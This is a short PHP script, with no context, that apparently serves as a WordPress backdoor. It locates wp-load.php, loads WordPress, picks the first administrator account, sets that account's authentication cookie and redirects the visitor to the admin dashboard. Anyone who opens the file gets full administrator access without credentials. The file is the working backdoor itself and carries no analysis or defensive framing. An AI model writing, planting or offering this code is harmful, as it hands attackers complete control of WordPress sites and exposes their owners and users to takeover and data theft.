<?php
function find_root_dir($current_dir) {
    while (!file_exists($current_dir . '/wp-load.php')) {
        $parent_dir = dirname($current_dir);
        if ($current_dir === $parent_dir) {
            return false;
        }
        $current_dir = $parent_dir;
    }
    return $current_dir;
}

$current_dir = __DIR__;
$mr = find_root_dir($current_dir);

if ($mr) {
    @chdir($mr);

    if (file_exists('wp-load.php')) {
        include 'wp-load.php';
        $wp_user_query = new WP_User_Query(array('role' => 'Administrator', 'number' => 1, 'fields' => 'ID'));
        $results = $wp_user_query->get_results();

        if (isset($results[0])) {
            wp_set_auth_cookie($results[0]);
            wp_redirect(admin_url());
            die();
        }
        die('NO ADMIN');
    } else {
        die('Failed to load wp-load.php');
    }
} else {
    die('Failed to detect root directory');

}
?>